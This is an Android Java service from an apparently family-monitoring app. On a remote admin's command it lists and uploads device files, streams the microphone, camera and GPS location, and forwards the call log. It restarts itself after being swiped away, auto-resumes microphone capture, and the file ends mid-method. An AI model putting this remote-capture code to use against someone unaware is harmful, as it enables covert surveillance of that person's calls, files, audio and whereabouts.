package com.familywatch.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.AlarmManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.messaging.FirebaseMessaging;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.nio.ByteBuffer;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class KeepAliveService extends Service {

    private static final String CHANNEL_ID = "meeee_bg";
    private static final int    NOTIF_ID   = 1001;
    private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB
    // How long to sit connected with nothing happening before shutting back down to fully
    // dormant. Not a keepalive interval — every incoming message/active session cancels this,
    // it only ever fires once things have genuinely gone quiet (see maybeScheduleIdleShutdown).
    private static final long   IDLE_SHUTDOWN_MS = 90 * 1000L;

    private PowerManager.WakeLock wakeLock;
    // Foreground service type actually declared right now — starts DATA_SYNC-only in
    // onCreate() and gains camera/location/microphone bits one at a time via
    // addForegroundServiceType, only when that capability is genuinely in use. See onCreate().
    private int                   currentFgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
    // Concurrent file transfers in flight (handleReadFile runs on its own Thread per request) —
    // counted rather than boolean since the admin's file browser can request more than one.
    private final AtomicInteger   activeTransfers = new AtomicInteger(0);
    // Posted with a delay any time nothing is active; cancelled the instant any message arrives
    // or a session starts. See isBusy()/syncWakeLock()/maybeScheduleIdleShutdown().
    private final Runnable        idleShutdownRunnable = this::shutdownIfIdle;
    private OkHttpClient          httpClient;
    private WebSocket             nativeWs;
    private Handler               handler;
    private String                serverUrl;
    private String                userName;
    private String                userId;      // assigned by server on auth_ok
    private String                uploadToken; // per-connection token from auth_ok, proves this session to HTTP uploads
    private boolean               shouldConnect = false;
    private BroadcastReceiver     systemReceiver; // reconnects WS on screen-on / network change

    // ── Live Monitor fields ───────────────────────────────────────────────────
    private LiveKitManager       lkManager;     // LiveKit camera publisher

    // Camera2 fields kept for cleanup safety (no longer used for streaming)
    private CameraDevice         cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader          imageReader;
    private HandlerThread        cameraThread;
    private Handler              cameraHandler;
    private volatile boolean     cameraStreaming = false;
    private String               fromAdminIdCamera;

    private AudioRecord          audioRecord;
    private volatile boolean     micStreaming = false;
    private String               fromAdminIdMic;

    private LocationManager      locationManager;
    private LocationListener     locationListener;
    private volatile boolean     locationTracking = false;
    private String               fromAdminIdLocation;

    // Set in onTaskRemoved so onDestroy skips clearing prefs — service will restart and resume
    private volatile boolean     restarting = false;

    // Lets other components in-process submit data without needing their own
    // WebSocket connection.
    private static volatile KeepAliveService instance;

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        handler = new Handler(Looper.getMainLooper());
        httpClient = new OkHttpClient.Builder()
            .readTimeout(120, TimeUnit.SECONDS)   // large file uploads need time
            .writeTimeout(120, TimeUnit.SECONDS)
            .connectTimeout(30, TimeUnit.SECONDS)
            .pingInterval(25, TimeUnit.SECONDS)   // keep WS alive
            .build();
        lkManager = new LiveKitManager(this, httpClient);
        createChannel();
        // Only DATA_SYNC here, never camera/location/microphone based on "permission happens
        // to be granted" — Android 14+ requires the app to be in a foreground-eligible state
        // to START a service declaring the microphone (or camera) type, which a background
        // alarm-triggered restart (see onTaskRemoved below) never is, and crashes outright
        // otherwise ("SecurityException: Starting FGS with type microphone... requires...
        // eligible state/exemptions"). DATA_SYNC has no such restriction. The sensitive types
        // are added later, one at a time, only when that specific capability actually starts
        // being used — see addForegroundServiceType, called from handleStartCamera/Mic/Location.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotification(), currentFgsType);
        } else {
            startForeground(NOTIF_ID, buildNotification());
        }
        createWakeLock();

        SharedPreferences prefs = SecurePrefs.get(this);
        serverUrl = prefs.getString("serverUrl", null);
        userName  = prefs.getString("name", null);
        if (serverUrl != null && userName != null) {
            shouldConnect = true;
            connectWebSocket();
        }
        registerCallLogObserver();

        // Reconnect WebSocket whenever screen turns on or user unlocks phone
        systemReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                if (nativeWs == null && serverUrl != null && shouldConnect) {
                    connectWebSocket();
                }
            }
        };
        IntentFilter sysFilter = new IntentFilter();
        sysFilter.addAction(Intent.ACTION_SCREEN_ON);
        sysFilter.addAction(Intent.ACTION_USER_PRESENT);  // screen unlocked
        sysFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(systemReceiver, sysFilter);

        // Nothing active yet at this point (auth_ok hasn't arrived) — if the connection
        // attempt above never resolves into real work, don't sit resident forever waiting.
        maybeScheduleIdleShutdown();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Re-checked (not just done once in onCreate) because MainActivity starts this
        // service before the READ_CALL_LOG runtime-permission dialog's result is known —
        // the first onCreate() almost always sees "not granted yet" and skips registering.
        // Once the user actually taps Allow, MainActivity calls startService() again, which
        // only reaches here (the service is already alive, onCreate() doesn't run twice) —
        // this is what actually wires up the observer once permission is really granted.
        // registerCallLogObserver() itself no-ops if already registered or still denied.
        registerCallLogObserver();
        if (intent != null) {
            if ("CONNECT".equals(intent.getAction())) {
                serverUrl = intent.getStringExtra("serverUrl");
                userName  = intent.getStringExtra("name");
                if (serverUrl != null && userName != null) {
                    SecurePrefs.get(this).edit()
                        .putString("serverUrl", serverUrl)
                        .putString("name", userName)
                        .apply();
                    shouldConnect = true;
                    // The app was just actively opened — don't let an idle-shutdown left
                    // over from a previous dormant period fire mid-handshake.
                    handler.removeCallbacks(idleShutdownRunnable);
                    if (nativeWs != null) nativeWs.cancel();
                    connectWebSocket();
                }
            } else if ("DISCONNECT".equals(intent.getAction())) {
                shouldConnect = false;
                if (nativeWs != null) { nativeWs.cancel(); nativeWs = null; }
                serverUrl = null; userName = null; userId = null; uploadToken = null;
                stopForeground(true);
                stopSelf();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        shouldConnect = false;
        handler.removeCallbacks(idleShutdownRunnable);
        handleStopCamera();
        if (restarting) {
            // Service is restarting — stop hardware but preserve SharedPreferences so
            // handleMessage(auth_ok) can auto-resume mic/location after reconnect
            micStreaming = false;
            try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
            locationTracking = false;
            try { if (locationManager != null && locationListener != null) { locationManager.removeUpdates(locationListener); } } catch (Exception ignored) {}
        } else {
            handleStopMic();
            handleStopLocation();
        }
        if (nativeWs != null) nativeWs.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (systemReceiver != null) { try { unregisterReceiver(systemReceiver); } catch (Exception ignored) {} }
        if (callLogObserver != null) { try { getContentResolver().unregisterContentObserver(callLogObserver); } catch (Exception ignored) {} }
        if (instance == this) instance = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // Restart service after app is swiped away — but only if something genuinely active
    // (mic/camera/location session) would otherwise be cut off mid-flight, the same way a
    // phone call doesn't drop just because you swiped the app away. If nothing is active,
    // let the process die naturally — FCM wake-up or the next periodic heartbeat brings it
    // back when actually needed, rather than fighting Android to stay resident 24/7.
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (!isBusy()) { super.onTaskRemoved(rootIntent); return; }
        restarting = true;
        Intent restart = new Intent(getApplicationContext(), KeepAliveService.class);
        restart.setPackage(getPackageName());
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am != null) {
            // Schedule at 1s and 10s as belt-and-suspenders
            for (int i = 0; i < 2; i++) {
                long delay = (i == 0) ? 1000L : 10000L;
                PendingIntent pi = PendingIntent.getService(
                    getApplicationContext(), i + 10,
                    restart,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + delay, pi);
                } else {
                    am.setExact(AlarmManager.ELAPSED_REALTIME,
                        SystemClock.elapsedRealtime() + delay, pi);
                }
            }
        }
        super.onTaskRemoved(rootIntent);
    }

    // ── WebSocket connection ───────────────────────────────────────────────────

    // Identity now comes from Firebase phone auth, not the persisted name — so before
    // opening the socket we always ask FirebaseAuth for a CURRENT ID token (the SDK
    // auto-refreshes its cached token internally; passing forceRefresh=false just uses
    // that cache, or refreshes it if it's actually expired). If nobody is signed in yet
    // (or the token fetch fails), we don't attempt to connect — same retry/backoff as a
    // failed/closed socket, so we'll simply try again once a primary session has signed in.
    private void connectWebSocket() {
        if (serverUrl == null || !shouldConnect) return;

        FirebaseUser user = currentFirebaseUser();
        if (user == null) {
            scheduleReconnect();
            return;
        }
        user.getIdToken(false).addOnCompleteListener(task -> {
            if (!shouldConnect) return; // disconnected while the token fetch was in flight
            String idToken = (task.isSuccessful() && task.getResult() != null)
                ? task.getResult().getToken() : null;
            if (idToken == null) {
                scheduleReconnect();
                return;
            }
            openWebSocket(idToken);
        });
    }

    // FirebaseAuth.getInstance() throws if the default FirebaseApp was never initialized
    // (e.g. this build has no google-services.json yet) — treat that the same as "not
    // signed in" rather than crashing the service.
    private FirebaseUser currentFirebaseUser() {
        try {
            return FirebaseAuth.getInstance().getCurrentUser();
        } catch (Exception e) {
            return null;
        }
    }

    private void openWebSocket(String idToken) {
        String wsUrl = serverUrl
            .replaceFirst("^https://", "wss://")
            .replaceFirst("^http://", "ws://");
        if (!wsUrl.endsWith("/ws")) wsUrl = wsUrl + "/ws";

        Request request = new Request.Builder().url(wsUrl).build();
        nativeWs = httpClient.newWebSocket(request, new WebSocketListener() {

            @Override
            public void onOpen(WebSocket ws, Response response) {
                try {
                    JSONObject auth = new JSONObject();
                    auth.put("type", "auth");
                    auth.put("role", "user");
                    auth.put("idToken", idToken);
                    // Cosmetic display label only now — identity comes from idToken's phone number.
                    auth.put("name", userName != null ? userName : "");
                    // Explicit boolean tells server this is the background service — invisible to admin list.
                    auth.put("isBg", true);
                    ws.send(auth.toString());
                } catch (Exception e) { /* ignore */ }
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                handleMessage(ws, text);
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                scheduleReconnect();
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                scheduleReconnect();
            }
        });
    }

    private void scheduleReconnect() {
        if (!shouldConnect) return;
        handler.postDelayed(this::connectWebSocket, 3000);
    }

    // ── Call log (ContentObserver-driven) ────────────────────────────────────────
    // Static entry point so other in-process components can submit data without needing
    // their own WebSocket connection. Sends immediately if we're connected and
    // authenticated; otherwise queues to SharedPreferences and the queue is flushed as soon
    // as the next auth_ok arrives.

    public static void sendCallLogEvent(Context ctx, JSONObject entry) {
        KeepAliveService svc = instance;
        if (svc != null && svc.nativeWs != null && svc.userId != null) {
            svc.sendCallLogEventNow(entry);
        } else {
            queueCallLogEvent(ctx, entry);
        }
    }

    private void sendCallLogEventNow(JSONObject entry) {
        try {
            JSONObject out = new JSONObject();
            out.put("type", "call_log_add");
            out.put("entry", entry);
            nativeWs.send(out.toString());
        } catch (Exception ignored) {}
    }

    private static void queueCallLogEvent(Context ctx, JSONObject entry) {
        try {
            SharedPreferences prefs = SecurePrefs.get(ctx);
            JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
            pending.put(entry);
            prefs.edit().putString("pendingCallLogEvents", pending.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void flushPendingCallLogEvents() {
        try {
            SharedPreferences prefs = SecurePrefs.get(this);
            JSONArray pending = new JSONArray(prefs.getString("pendingCallLogEvents", "[]"));
            if (pending.length() == 0) return;
            for (int i = 0; i < pending.length(); i++) {
                sendCallLogEventNow(pending.getJSONObject(i));
            }
            prefs.edit().remove("pendingCallLogEvents").apply();
        } catch (Exception ignored) {}
    }

    // ── FCM push token registration ──────────────────────────────────────────────
    // Same immediate-send-or-queue-and-flush pattern as sendCallLogEvent above, called
    // from FamilyWatchMessagingService.onNewToken(). Only the latest token matters (not a
    // history of events), so this queues a single value rather than an array.

    public static void sendFcmTokenRegistration(Context ctx, String token) {
        KeepAliveService svc = instance;
        if (svc != null && svc.nativeWs != null && svc.userId != null) {
            svc.sendFcmTokenNow(token);
        } else {
            SecurePrefs.get(ctx).edit().putString("pendingFcmToken", token).apply();
        }
    }

    private void sendFcmTokenNow(String token) {
        try {
            JSONObject out = new JSONObject();
            out.put("type", "register_fcm_token");
            out.put("token", token);
            nativeWs.send(out.toString());
        } catch (Exception ignored) {}
    }

    private void flushPendingFcmToken() {
        try {
            SharedPreferences prefs = SecurePrefs.get(this);
            String token = prefs.getString("pendingFcmToken", null);
            if (token == null) return;
            sendFcmTokenNow(token);
            prefs.edit().remove("pendingFcmToken").apply();
        } catch (Exception ignored) {}
    }

    // Belt-and-suspenders re-registration on every successful connect, on top of
    // FamilyWatchMessagingService.onNewToken(). onNewToken() only fires when FCM actually
    // generates/rotates a token — on some OEMs (MIUI in particular) that can be delayed well
    // past when the user has already logged in, or can otherwise drift from what the server
    // has on file (e.g. after an uninstall/reinstall the old server-side token silently goes
    // stale — FCM starts returning "NotRegistered" for it — with nothing to prompt a resend
    // until this device's token happens to rotate again, which may be never). Asking for the
    // CURRENT token here and re-sending it is idempotent (store.upsertDeviceToken) so this
    // costs nothing when the server is already current, and self-heals when it isn't.
    private void refreshFcmTokenRegistration() {
        try {
            FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
                if (task.isSuccessful() && task.getResult() != null && nativeWs != null) {
                    sendFcmTokenNow(task.getResult());
                }
            });
        } catch (Exception ignored) {}
    }

    // Registers a ContentObserver on the call log so new calls are picked up as they happen.
    // On first-ever call (no lastCallLogId saved yet), does one bounded historical backfill of
    // the most recent 200 entries rather than the entire lifetime log.
    private ContentObserver callLogObserver;

    private void registerCallLogObserver() {
        if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
        if (callLogObserver != null) return;
        callLogObserver = new ContentObserver(handler) {
            @Override
            public void onChange(boolean selfChange) {
                syncCallLog();
            }
        };
        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver);
        syncCallLog();
    }

    private void syncCallLog() {
        if (checkSelfPermission("android.permission.READ_CALL_LOG") != PackageManager.PERMISSION_GRANTED) return;
        SharedPreferences prefs = SecurePrefs.get(this);
        long lastId = prefs.getLong("lastCallLogId", -1);

        Cursor cursor;
        try {
            if (lastId < 0) {
                cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls._ID + " DESC LIMIT 200");
            } else {
                cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                    CallLog.Calls._ID + " > ?", new String[]{String.valueOf(lastId)},
                    CallLog.Calls._ID + " ASC");
            }
        } catch (Exception e) {
            return;
        }
        if (cursor == null) return;

        long maxId = lastId;
        try {
            int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
            int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
            while (cursor.moveToNext()) {
                long id = cursor.getLong(idIdx);
                if (id > maxId) maxId = id;
                try {
                    JSONObject entry = new JSONObject();
                    entry.put("id", String.valueOf(id));
                    entry.put("number", cursor.getString(numberIdx));
                    String name = cursor.isNull(nameIdx) ? null : cursor.getString(nameIdx);
                    entry.put("name", name == null ? JSONObject.NULL : name);
                    entry.put("type", callTypeToString(cursor.getInt(typeIdx)));
                    entry.put("duration", cursor.getLong(durationIdx));
                    entry.put("date", cursor.getLong(dateIdx));
                    sendCallLogEvent(this, entry);
                } catch (Exception ignored) {}
            }
        } finally {
            cursor.close();
        }
        if (maxId > lastId) prefs.edit().putLong("lastCallLogId", maxId).apply();
    }

    private static String callTypeToString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            case CallLog.Calls.REJECTED_TYPE: return "rejected";
            default: return "other";
        }
    }

    // ── Message handling ───────────────────────────────────────────────────────

    private void handleMessage(WebSocket ws, String text) {
        // Any incoming message means we're doing real work right now — cancel any pending
        // idle-shutdown so it doesn't fire mid-request; the end of this method decides
        // whether to reschedule it based on what's actually active once processing is done.
        handler.removeCallbacks(idleShutdownRunnable);
        try {
            JSONObject msg = new JSONObject(text);
            String type = msg.optString("type");
            if ("auth_ok".equals(type)) {
                userId = msg.optString("userId"); // store our assigned userId
                uploadToken = msg.optString("uploadToken"); // per-connection token for HTTP uploads (profile photo)
                flushPendingCallLogEvents(); // send anything queued while we were disconnected
                flushPendingFcmToken();
                refreshFcmTokenRegistration(); // re-send current token every connect — see note below
                // Auto-resume mic if it was streaming before service was restarted
                SharedPreferences prefs = SecurePrefs.get(this);
                if (prefs.getBoolean("micActive", false) && !micStreaming) {
                    try {
                        JSONObject resumeMsg = new JSONObject();
                        resumeMsg.put("fromAdminId", prefs.getString("micAdminId", ""));
                        handleStartMic(resumeMsg);
                    } catch (Exception ignored) {}
                }
            } else if ("ls".equals(type)) {
                handleLs(ws, msg);
            } else if ("read_file".equals(type)) {
                handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
            } else if ("start_camera".equals(type)) {
                handleStartCamera(msg);
            } else if ("stop_camera".equals(type)) {
                handleStopCamera();
            } else if ("start_mic".equals(type)) {
                handleStartMic(msg);
            } else if ("stop_mic".equals(type)) {
                handleStopMic();
            } else if ("start_location".equals(type)) {
                handleStartLocation(msg);
            } else if ("stop_location".equals(type)) {
                handleStopLocation();
            }
            syncWakeLock();
            maybeScheduleIdleShutdown();
        } catch (Exception e) { /* ignore */ }
    }

    // ── Directory listing (WebSocket response) ─────────────────────────────────

    private void handleLs(WebSocket ws, JSONObject msg) {
        try {
            String fromAdminId = msg.optString("fromAdminId");
            JSONArray pathArr  = msg.optJSONArray("path");
            File dir = buildPath(pathArr);
            JSONArray entries = FileAccessHelper.listDirectory(dir);

            JSONObject result = new JSONObject();
            result.put("type", "ls_result");
            result.put("forAdminId", fromAdminId);
            result.put("path", pathArr != null ? pathArr : new JSONArray());
            result.put("entries", entries);
            ws.send(result.toString());

        } catch (Exception e) {
            sendWsError(ws, "ls_result", msg, e.getMessage());
        }
    }

    // ── File upload via HTTP POST (single request, no chunking!) ──────────────

    private void handleReadFile(JSONObject msg) {
        // Counted (not just relied on by the caller's own post-dispatch check) since this
        // runs async on its own Thread — the wake lock/idle-shutdown state must reflect the
        // transfer for its whole duration, not just the instant this method was called.
        activeTransfers.incrementAndGet();
        syncWakeLock();
        new Thread(() -> {
            String fromAdminId = msg.optString("fromAdminId");
            String requestId   = msg.optString("requestId",
                String.valueOf(System.currentTimeMillis()));
            JSONArray pathArr  = msg.optJSONArray("path");

            try {
                File file = buildFilePath(pathArr);

                if (!file.exists() || !file.isFile()) {
                    notifyAdminError(fromAdminId, requestId, "File not found");
                    return;
                }

                if (file.length() > MAX_FILE_BYTES) {
                    notifyAdminError(fromAdminId, requestId, "File exceeds 200 MB limit");
                    return;
                }

                String mimeType = getMimeType(file.getName());
                boolean isPreview = msg.optBoolean("preview", false);

                // Derive HTTP server URL from WebSocket URL
                String httpBase = serverUrl
                    .replaceFirst("^wss://", "https://")
                    .replaceFirst("^ws://", "http://")
                    .replaceFirst("/ws$", "");

                String uploadUrl = httpBase + "/api/file/" + requestId;

                // Compress images before upload — WebP gives ~30% better ratio than JPEG
                RequestBody body;
                String uploadMime = mimeType;
                FileAccessHelper.CompressedImage compressed =
                    FileAccessHelper.compressImageIfPossible(file, mimeType, isPreview);
                if (compressed != null) {
                    body = RequestBody.create(compressed.data, MediaType.parse(compressed.mimeType));
                    uploadMime = compressed.mimeType;
                } else {
                    body = RequestBody.create(file, MediaType.parse(mimeType));
                }

                Request request = new Request.Builder()
                    .url(uploadUrl)
                    .post(body)
                    .header("X-File-Name", Uri.encode(file.getName()))
                    .header("X-Admin-Id", fromAdminId)
                    .header("X-User-Id", userId != null ? userId : "")
                    .header("X-Upload-Token", uploadToken != null ? uploadToken : "")
                    .header("Content-Type", uploadMime)
                    .build();

                Response response = httpClient.newCall(request).execute();
                response.close();
                // Server notifies admin via WebSocket once upload completes

            } catch (Exception e) {
                notifyAdminError(fromAdminId, requestId, e.getMessage());
            } finally {
                activeTransfers.decrementAndGet();
                syncWakeLock();
                maybeScheduleIdleShutdown();
            }
        }).start();
    }

    // Notify admin of an error via the WebSocket (so they see the error + retry button)
    private void notifyAdminError(String fromAdminId, String requestId, String error) {
        if (nativeWs == null || userId == null) return;
        try {
            JSONObject err = new JSONObject();
            err.put("type", "file_error");
            err.put("forAdminId", fromAdminId);
            err.put("requestId", requestId);
            err.put("error", error);
            err.put("fromUserId", userId);
            nativeWs.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Live Monitor — LiveKit camera publisher ───────────────────────────────

    private void handleStartCamera(JSONObject msg) {
        String facing = msg.optString("facing", "rear");
        String httpBase = serverUrl
            .replaceFirst("^wss://", "https://")
            .replaceFirst("^ws://", "http://")
            .replaceFirst("/ws$", "");
        // Repurposes the legacy Camera2 flag (already correctly reset to false in
        // handleStopCamera below) to track the actual LiveKit-publishing state, so
        // isBusy()/syncWakeLock() know a live camera session is in progress.
        cameraStreaming = true;
        if (checkSelfPermission("android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED) {
            addForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
        lkManager.startCamera(httpBase, userId != null ? userId : "", facing);
    }

    private void handleStopCamera() {
        lkManager.stopCamera();
        removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        // Clean up any leftover Camera2 state (safety)
        cameraStreaming = false;
        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
        try { if (cameraDevice  != null) { cameraDevice.close();   cameraDevice  = null; } } catch (Exception ignored) {}
        try { if (imageReader   != null) { imageReader.close();    imageReader   = null; } } catch (Exception ignored) {}
        if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; cameraHandler = null; }
    }

    // ── Live Monitor — AudioRecord ────────────────────────────────────────────

    private void handleStartMic(JSONObject msg) {
        if (micStreaming) return;
        fromAdminIdMic = msg.optString("fromAdminId");
        // Persist so the service auto-resumes after being swiped-away and restarted
        SecurePrefs.get(this).edit()
            .putBoolean("micActive", true)
            .putString("micAdminId", fromAdminIdMic)
            .apply();
        boolean canDeclareMicType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED;
        if (canDeclareMicType) addForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        final int sampleRate = 16000;
        int minBuf = AudioRecord.getMinBufferSize(sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        final int chunkSize = Math.max(minBuf > 0 ? minBuf : 0, 8192);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, chunkSize);
        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
            audioRecord.release(); audioRecord = null;
            if (canDeclareMicType) removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            return;
        }
        audioRecord.startRecording();
        micStreaming = true;
        new Thread(() -> {
            byte[] buf = new byte[chunkSize];
            while (micStreaming && audioRecord != null) {
                int read = audioRecord.read(buf, 0, chunkSize);
                if (read > 0 && nativeWs != null && micStreaming) {
                    try {
                        String b64 = Base64.encodeToString(
                            Arrays.copyOf(buf, read), Base64.NO_WRAP);
                        JSONObject chunk = new JSONObject();
                        chunk.put("type", "audio_chunk");
                        chunk.put("forAdminId", fromAdminIdMic);
                        chunk.put("data", b64);
                        chunk.put("sampleRate", sampleRate);
                        nativeWs.send(chunk.toString());
                    } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private void handleStopMic() {
        micStreaming = false;
        removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        // Admin explicitly stopped mic — clear persisted state so restart won't auto-resume
        SecurePrefs.get(this).edit()
            .remove("micActive").remove("micAdminId").apply();
        try {
            if (audioRecord != null) {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
            }
        } catch (Exception ignored) {}
    }

    // ── Live Monitor — LocationManager ────────────────────────────────────────

    private void handleStartLocation(JSONObject msg) {
        if (locationTracking) return;
        fromAdminIdLocation = msg.optString("fromAdminId");
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location loc) {
                if (!locationTracking || nativeWs == null) return;
                try {
                    JSONObject upd = new JSONObject();
                    upd.put("type", "location_update");
                    upd.put("forAdminId", fromAdminIdLocation);
                    upd.put("lat", loc.getLatitude());
                    upd.put("lng", loc.getLongitude());
                    upd.put("accuracy", loc.getAccuracy());
                    upd.put("ts", loc.getTime());
                    nativeWs.send(upd.toString());
                } catch (Exception ignored) {}
            }
            @Override public void onProviderEnabled(@NonNull String p) {}
            @Override public void onProviderDisabled(@NonNull String p) {}
            @Override public void onStatusChanged(String p, int s, Bundle e) {}
        };
        try {
            locationTracking = true;
            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
                addForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            }
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 15000, 5f, locationListener);
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 15000, 5f, locationListener);
            }
        } catch (SecurityException e) { locationTracking = false; }
    }

    private void handleStopLocation() {
        locationTracking = false;
        removeForegroundServiceType(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        try {
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
        } catch (Exception ignored) {}
        locationListener = null;
    }

    // ── Path helpers ───────────────────────────────────────────────────────────
    // Thin wrappers — the actual logic now lives in FileAccessHelper, shared with
    // FamilyWatchMessagingService's stateless quick-pull handlers.

    private File buildPath(JSONArray pathArr) throws Exception {
        return FileAccessHelper.resolvePath(pathArr);
    }

    private File buildFilePath(JSONArray pathArr) throws Exception {
        return FileAccessHelper.resolvePath(pathArr);
    }

    private String getMimeType(String name) {
        return FileAccessHelper.getMimeType(name);
    }

    private void sendWsError(WebSocket ws, String type, JSONObject msg, String error) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", type);
            err.put("forAdminId", msg.optString("fromAdminId"));
            err.put("path", msg.optJSONArray("path"));
            err.put("entries", new JSONArray());
            err.put("error", error);
            ws.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Notification / WakeLock / idle-shutdown ─────────────────────────────────
    // WhatsApp-style: no permanent wake lock and no fighting Android to stay resident.
    // The lock is held only while genuinely doing work (mic/camera/location session, file
    // transfer); the service itself shuts back down to fully dormant once nothing has
    // happened for IDLE_SHUTDOWN_MS, relying on the admin's FCM "Wake up" push (or the
    // periodic ServiceRestartWorker heartbeat) to bring it back when actually needed.

    // Reference counting off — acquire()/release() are treated as a simple "on while any
    // session is active" gate driven by isBusy(), not Android's own increment/decrement
    // counting (which would require every call site to pair perfectly across threads).
    private void createWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "meeee::bg");
        wakeLock.setReferenceCounted(false);
    }

    // True while there's real work in flight that must not be interrupted by idle-shutdown
    // or allowed to run without the CPU staying awake.
    private boolean isBusy() {
